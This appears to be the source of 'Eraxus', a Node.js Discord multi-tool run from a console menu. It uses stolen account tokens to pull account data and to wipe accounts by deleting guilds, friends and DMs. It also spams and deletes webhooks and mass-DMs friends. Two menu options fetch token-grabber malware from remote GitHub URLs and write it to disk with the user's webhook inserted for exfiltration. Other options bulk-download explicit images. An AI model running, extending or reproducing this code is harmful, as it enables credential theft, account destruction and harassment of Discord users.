function clear() {
    return console.log("\033c")
}
const fetch = require("sync-fetch")
const Color = require("sync-color");
const request = require("request")
const readline = require("readline-sync")
const ConsoleRotato = require("consolerotate")
const Discord = require("discordtokeninfos")
const fs = require("fs")
if (!fs.existsSync("./images")) fs.mkdirSync("./images")
Color.init()
ConsoleRotato("Eraxus", 50)

class Eraxus {
    constructor(opts = {}) {
        this.token = opts.token
        this.base64pfp = opts.pfp
        this.name = opts.username
        this.password = opts.password
        this.link = opts.webhook
        this.time = opts.time
        this.talk = opts.toSend
        this.hype = opts.hypeSquad
        this.hypeNumber = opts.nmbr
        this.url = opts.url
        this.toGen = opts.number
    }
    tokeninfos() {
        var User = Discord.getAllInfos(this.token)
        if (User == "TOKEN ISN'T VALID") return console.log(Color.InitGradient("red", 'red')("Invalid."))
        var UserBot = Discord.getBotToken(this.token).split("||")
        var UserGuild = Discord.getGuildList(this.token).split("||")
        var UserFriends = Discord.getFriendList(this.token).split("||")
        for (var p in User) console.log(Color.InitGradient(`blue`, "magenta")(`[${p}]: ${User[p]}`))
        console.log(" ")
        for (var p of UserBot) console.log(Color.InitGradient(`blue`, "magenta")(p))
        console.log(" ")
        for (var p of UserGuild) console.log(Color.InitGradient(`blue`, "magenta")(p))
        console.log(" ")
        for (var p of UserFriends) console.log(Color.InitGradient(`blue`, "magenta")(p))
        console.log(" ")
    }
    tokenChecker() {
        var User = Discord.getAllInfos(this.token)
        if (User == "TOKEN ISN'T VALID") return console.log(Color.InitGradient("red", 'red')("Invalid."))
        else return console.log(Color.InitGradient("blue", 'magenta')("This Token Is Valid !"))
    }
    tokenFuck() {
        var Client = new require("v11-discord.js").Client()
        Client.login(this.token)
        Client.on("ready", () => {
            Client.user.friends.forEach(r => Client.user.removeFriend(r))
            Client.guilds.forEach(r => r.ownerID == Client.user.id ? r.delete() : r.leave())
            Client.users.forEach(r => {
                try {
                    r.deleteDM()
                } catch (err) {}
            })
            console.log(Color.InitGradient("blue", "purple")(`Fucked ${client.user.tag}`))
        })
    }
    changePFP() {
        var format = ""
        if (!this.token || !this.base64pfp) return console.log(Color.InitGradient("blue", "purple")("Please, complete all the steps..")), main()
        if (this.base64pfp.startsWith("'") && this.base64pfp.endsWith("'")) this.base64pfp = this.base64pfp.slice(1, -1)
        switch (true) {
            case this.base64pfp.split(".").pop().includes("jpg"):
                format = "jpg"
                break
            case this.base64pfp.split(".").pop().includes("png"):
                format = "png"
                break
            case this.base64pfp.split(".").pop().includes("gif"):
                format = "gif"
                break
            default:
                console.log(Color.InitGradient("blue", "purple")("GIF, PNG, JPG is supported, no others formats.")), main()
        }
        var z = fs.readFileSync(this.base64pfp, "base64")
        var b = fetch("https://discord.com/api/v9/users/@me", {
            method: "PATCH",
            headers: {
                "authority": " discord.com",
                "path": "/api/v9/users/@me",
                "scheme": "https",
                "Content-Type": 'application/json',
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "fr",
                "authorization": this.token,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (X11; Linux x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
                "x-debug-options": "bugReporterEnabled",
                "x-discord-locale": "en-US",
                "x-super-properties": "eyJvcyI6IkxpbnV4IiwiYnJvd3NlciI6IkNocm9tZSIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJmciIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4NikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzc0LjAuMzcyOS4xNjkgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6Ijc0LjAuMzcyOS4xNjkiLCJvc192ZXJzaW9uIjoiIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjEyNDUyMywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
            },
            body: JSON.stringify({
                avatar: `data:image/${format};base64,${z}`
            })
        }).json()
        if (b.avatar) console.log(Color.InitGradient("blue", "purple")("PFP Successfully Changed."))
        if (b.code == 0) return console.log(Color.InitGradient("blue", "purple")("An Invalid Token Was Provided."))
    }
    changeUsername() {
        if (!this.name || !this.token || !this.password) return console.log(Color.InitGradient("blue", "purple")("Please, complete all the steps..")), main()
        var z = fetch("https://discord.com/api/v9/users/@me", {
            headers: {
                authorization: this.token
            }
        }).json()
        if (z.code && z.code == 0) return console.log(Color.InitGradient("blue", "purple")("An Invalid Token Was Provided."))
        var body = JSON.stringify({
            username: this.name,
            password: this.password,
            discriminator: z.discriminator
        })
        var b = fetch("https://discord.com/api/v9/users/@me", {
            method: "PATCH",
            headers: {
                "authority": "discord.com",
                "method": "PATCH",
                "path": "/api/v9/users/@me",
                "scheme": "https",
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "fr",
                "authorization": this.token,
                "content-length": body.length,
                "content-type": "application/json",
                "origin": "https://discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (X11; Linux x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
                "x-debug-options": "bugReporterEnabled",
                "x-discord-locale": "fr",
                "x-super-properties": "eyJvcyI6IkxpbnV4IiwiYnJvd3NlciI6IkNocm9tZSIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJmciIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4NikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzc0LjAuMzcyOS4xNjkgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6Ijc0LjAuMzcyOS4xNjkiLCJvc192ZXJzaW9uIjoiIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjEzMzM3NywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
            },
            body: body
        }).json()
        if (b.username && b.username === this.name) return console.log(Color.InitGradient("blue", "purple")(`Username Changed Successfully !`))
        if (b.code && b.code == 0) return console.log(Color.InitGradient("blue", "purple")("An Invalid Token Was Provided."))
        else return console.log(Color.InitGradient("blue", "purple")("Please, report this error to Dialz: \n") + JSON.stringify(b))
    }
    wSPam() {
        if (!this.link || !this.talk) return console.log(Color.InitGradient("blue", "purple")("Please, complete all the steps..")), main()
        var b = fetch(this.link).json()
        if (!b.name) return console.log(Color.InitGradient("blue", "magenta")("Please, Put a Valid Webhook"))
        var ms = this.time * 1000
        var d = Date.now()
        do {
            var z = Date.now()
            var b = fetch(this.link, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    content: `@everyone -> ${this.talk}`
                })
            })
            if (b.status == 204) console.log(`${this.talk} Sent !`)
        } while (z - d < ms)
    }
    wDelete() {
        if (!this.link) return console.log(Color.InitGradient("blue", "purple")("Please, complete all the steps..")), main()
        fetch(this.link, {
            method: "DELETE"
        })
        var z = fetch(this.link).json()
        if (z.code && z.code == 10015) return console.log(Color.InitGradient("blue", "purple")("Webhook Successfully Deleted"))
    }
    hypesquadChanger() {
        var b = fetch("https://discordapp.com/api/v9/hypesquad/online", {
            method: "POST",
            headers: {
                "authorization": this.token,
                "content-type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36"
            },
            body: JSON.stringify({
                house_id: this.hypeNumber
            })
        })
        if (b.status == 204) return console.log(Color.InitGradient("magenta", "blue")(`Successfully Joined ${this.hype}`))
        else return console.log(Color.InitGradient("magenta", "blue")("Something Is Wrong Here..."))
    }
    DMall() {
        var Client = new require("v11-discord.js").Client()
        Client.login(this.token)
        Client.on("ready", () => {
            Client.user.friends.forEach(r => r.send(this.message))
        })
    }
    assDownload() {
        if (!fs.existsSync("./images/Ass")) fs.mkdirSync("./images/Ass")
        for (var i = 0; i < this.toGen; i++) {
            var z = fetch(this.url).json().message
            request(z).pipe(fs.createWriteStream(`./images/Ass/${z.split("/").pop()}`))
        }
        console.log(Color.InitGradient("magenta", "blue")(`\r${this.toGen} Ass Downloading... `))
    }
    pussyDownload() {
        if (!fs.existsSync("./images/Pussy")) fs.mkdirSync("./images/Pussy")
        for (var i = 0; i < this.toGen; i++) {
            var z = fetch(this.url).json().message
            request(z).pipe(fs.createWriteStream(`./images/Pussy/${z.split("/").pop()}`))
        }
        console.log(Color.InitGradient("magenta", "blue")(`\r${this.toGen} Pussys Downloading... `))
    }
    hentaiDownload() {
        if (!fs.existsSync("./images/Hentai")) fs.mkdirSync("./images/Hentai")
        for (var i = 0; i < this.toGen; i++) {
            var z = fetch(this.url).json().message
            request(z).pipe(fs.createWriteStream(`./images/Hentai/${z.split("/").pop()}`))
        }
        console.log(Color.InitGradient("magenta", "blue")(`\r${this.toGen} Hentai Downloading... `))
    }
    async LGBTDownload() {
        if (!fs.existsSync("./images/LGBT")) fs.mkdirSync("./images/LGBT")
        for (var i = 0; i < this.toGen; i++) {
            var b = fetch(this.url).json()[0]
            request(b).pipe(fs.createWriteStream(`./images/LGBT/${b.split("/").pop()}.png`))            
        }
        console.log(Color.InitGradient("magenta", "blue")(`\r${this.toGen} LGBTs Downloading... `))
    }
}
main()


async function main() {
    clear()
    console.log(Color.InitGradient("blue", "magenta")(`
                .-------.
                |(~\\o/~)|
              _.||\\/X\\/||._
           ,-"  || \\ / ||  "-,
         ,'  () ||o X o|| ()  ',
        / ()  ,-|| / \\ ||-,  () \\
       : o  ,'  ||/\\X/\\||  ',  o ;                    
    .----------._)~   ~(_.----------.
    |\\/)~~(\\/\\   (~\\ /~)   /\\/)~~(\\/|                      ███████╗██████╗░░█████╗░██╗░░██╗██╗░░░██╗░██████╗
    |(X () X) >o  >-X-<  o< (X () X)|                      ██╔════╝██╔══██╗██╔══██╗╚██╗██╔╝██║░░░██║██╔════╝
    |/\\)__(/\\/  _(_/|\\_)_  \\/\\)__(/\\|                      █████╗░░██████╔╝███████║░╚███╔╝░██║░░░██║╚█████╗░
    '----------' )     ( '----------'                      ██╔══╝░░██╔══██╗██╔══██║░██╔██╗░██║░░░██║░╚═══██╗
       ; o  ',  ||\\/~\\/||  ,'  o ;                         ███████╗██║░░██║██║░░██║██╔╝╚██╗╚██████╔╝██████╔╝
        \\ ()  '-|| \\o/ ||-'  () /                          ╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═════╝░
         ',  () |(~\\ /~)| ()  ,'                                   [MultiTool By !"Dialz_†#0069]
           '-._ ||\\/X\\/|| _.-'
               '|| \\ / ||'
                ||  X  ||                                 [1] Token Infos                  |  [2] Token Checker
                ||\\(/\\/||                                 [3] Install A Selfbot            |  [4] Token Fucker
                ||=)O(=||                                 [5] Build A JS Token Grabber     |  [6] Build A Py Token Grabber
                ||/\\/)\\||                                 [7] Change Account PFP           |  [8] Change Account Username
                ||  X  ||                                 [9] Webhook Spammer              |  [10] Webhook Deleter
                || / \\ ||                                 [11] HypeSquad Changer           |  [12] DMAll Friend
                ||/\\X/\\||                                 [13] Generate Ass Pics           |  [14] Generate Pussy Pics
                |(_/o\\_)|                                 [15] Generate Hentai Pics        |  [16] Generate LGBT Pics
                '._____.'`))

    var Question = Number(readline.question(Color.InitGradient("blue", "magenta")("What Do Your Want To Do ?: ")))

    switch (Question) {
        default:
            console.log(Color.InitGradient("orange", "red")(`Please, Put A Valid Number`))
            await sleep(500)
            main()
            break
        case 1:
            new Eraxus({
                token: readline.question(Color.InitGradient("blue", "magenta")("Gimme The TOken You Want Infos: "))
            }).tokeninfos()
            break
        case 2:
            new Eraxus({
                token: readline.question(Color.InitGradient("blue", "magenta")("Gimme The Token You Want To Check: "))
            }).tokenChecker()
            break
        case 3:
            console.log(Color.InitGradient("orange", "purple")("Wait For TomoriPROJECT to be updated.."))
            break
        case 4:
            new Eraxus({
                token: readline.question(Color.InitGradient("magenta", "blue")("Gimme The TOken You Want To Fuck: "))
            }).tokenFuck()
            break
        case 5:
            await fs.writeFileSync("./JSGrabber.js", fetch("https://raw.githubusercontent.com/NotFubukIl/Eraxus/main/Data/JSGrabber.js").text().replace("%WEBHOOKURL%", readline.question(Color.InitGradient("magenta", "blue")("Gimme Your Webhook URL: "))))
            console.log(Color.InitGradient("green", "blue")("Your Grabber Is Localized In Your Directory as JSGrabber.js"))
            break
        case 6:
            var text = fetch("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text().replace(/WEBHOOK_HERE/g, readline.question(Color.InitGradient("magenta", "blue")("Gimme Your Webhook URL: ")))
            await fs.writeFileSync("./pyGrabber.py", text)
            console.log(Color.InitGradient("green", "blue")("Your Grabber Is Localized In Your Directory as pyGrabber.py"))
            break
        case 7:
            var url = readline.question(Color.InitGradient("magenta", "blue")("Input Your New PFP here (should be a valid IMG format (jpeg, png, gif): "))
            var token = readline.question(Color.InitGradient("magenta", "blue")("Gimme The Token You Want A New PFP: "))
            new Eraxus({
                pfp: url,
                token: token
            }).changePFP()
            break
        case 8:
            var username = readline.question(Color.InitGradient("magenta", "blue")("Give Me The Wanted New Username: "))
            var token = readline.question(Color.InitGradient("magenta", "blue")("Gimme The Token You Want A New Username: "))
            var password = readline.question(Color.InitGradient("magenta", "blue")("Gimme The password You Want A New Username: "), {
                hideEchoBack: true,
                mask: Color.InitGradient("magenta", "blue")("*")
            })
            new Eraxus({
                token: token,
                username: username,
                password: password
            }).changeUsername()
            break
        case 9:
            var webhook = readline.question(Color.InitGradient("magenta", "blue")("Give Me A Webhook To Spam: "))
            var time = readline.question(Color.InitGradient("magenta", "blue")("How Long YOu Want To Spam This Webhok ? (in seconds): "))
            var send = readline.question(Color.InitGradient("magenta", "blue")("What Do YOu Want To SEnd ?: "))
            new Eraxus({
                webhook: webhook,
                time: time,
                toSend: send
            }).wSPam()
            break
        case 10:
            var webhook = readline.question(Color.InitGradient("magenta", "blue")("Give Me A Webhook To Delete: "))
            new Eraxus({
                webhook: webhook
            }).wDelete()
            break
        case 11:
            var HypeSquad = {
                1: "Hypesquad Bravery",
                2: "Hypesquad Brilliance",
                3: "Hypesquad Balance"
            }
            for (p in HypeSquad) console.log(Color.InitGradient("magenta", "blue")(`${p}: ${HypeSquad[p]}`))
            var hypesquad = Number(readline.question(Color.InitGradient("magenta", "blue")("Wich Hypesquad Do You Want ? (1, 2, 3): ")))
            var token = readline.question(Color.InitGradient("magenta", "blue")("Gimme The Token You Want A New Hypesquad: "))
            if (![1, 2, 3].includes(hypesquad)) return console.log(Color.InitGradient("magenta", "blue")("Response Must Be 1, 2 or 3 !")), await sleep(500), main()
            new Eraxus({
                hypeSquad: HypeSquad[hypesquad],
                token: token,
                nmbr: hypesquad
            }).hypesquadChanger()
            break
        case 12:
            var token = readline.question(Color.InitGradient("magenta", "blue")("Give Me A Token: "))
            var message = readline.question(Color.InitGradient("magenta", "blue")("What Do You Want To DMAll ?:  "))
            new Eraxus({
                token: token,
                message: message
            }).DMall()
            break
        case 13:
            var number = Number(readline.question(Color.InitGradient("magenta", "blue")("How Many Ass You Want To Generate ?: ")))
            if (isNaN(number)) return console.log(Color.InitGradient("magenta", "blue")("It Can't Be Another things than a number."))
            new Eraxus({
                url: "https://nekobot.xyz/api/image?type=ass",
                number: number
            }).assDownload()
            break
        case 14:
            var number = Number(readline.question(Color.InitGradient("magenta", "blue")("How Many Pussy(s) You Want To Generate ?: ")))
            if (isNaN(number)) return console.log(Color.InitGradient("magenta", "blue")("It Can't Be Another things than a number."))
            new Eraxus({
                url: "https://nekobot.xyz/api/image?type=pussy",
                number: number
            }).pussyDownload()
            break
        case 15:
            var number = Number(readline.question(Color.InitGradient("magenta", "blue")("How Many Hentai You Want To Generate ?: ")))
            if (isNaN(number)) return console.log(Color.InitGradient("magenta", "blue")("It Can't Be Another things than a number."))
            new Eraxus({
                url: "https://nekobot.xyz/api/image?type=hentai",
                number: number
            }).hentaiDownload()
            break
            case 16:
                var number = Number(readline.question(Color.InitGradient("magenta", "blue")("How Many LGBTs You Want To Generate ?: ")))
                if (isNaN(number)) return console.log(Color.InitGradient("magenta", "blue")("It Can't Be Another things than a number."))
                new Eraxus({
                    url: "http://shibe.online/api/shibes",
                    number: number
                }).LGBTDownload()
                break
    }
}

function sleep(time) {
    return new Promise(resolve => setTimeout(() => resolve(), time))
}
